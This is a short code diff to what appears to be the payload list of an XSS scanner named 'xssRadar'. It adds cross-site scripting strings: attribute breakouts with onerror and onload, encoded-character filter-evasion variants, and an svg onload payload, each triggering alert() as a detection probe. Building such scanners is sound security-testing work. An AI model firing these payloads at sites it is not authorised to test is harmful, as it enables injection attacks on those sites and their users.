@@ -3,6 +3,9 @@ xssRadar.scanner.payloads.general = [
 '<script>alert({id})</script>',
 '"><img src=x onerror=alert({id})>',
 '" onload=alert({id})',
+'" onerror=alert({id})',
+'" onerror=alert({id})>',
+'" onerror=%26%2365534;alert%26%2365534;(%26%2365534;{id}%26%2365534;)>',
 "\"><img src=x onerror=alert({id})>",
 "</script><svg/onload=alert({id})>",
 "<body onload=alert({id})>",
@@ -17,5 +20,6 @@ xssRadar.scanner.payloads.general = [
 "<sc<script>ript>alert({id})</sc</script>ript>",
 "<script\\x20type=\"text/javascript\">javascript:alert({id});</script>",
 "'`\"><\\x3Cscript>javascript:alert({id})</script>",
-"<<SCRIPT>alert(\"{id}\");//<</SCRIPT>"
+"<<SCRIPT>alert(\"{id}\");//<</SCRIPT>",
+"\"><svg/onload=&#65534;alert&#65534;&#65534;&#65534;&#65534;(1)>"
 ]
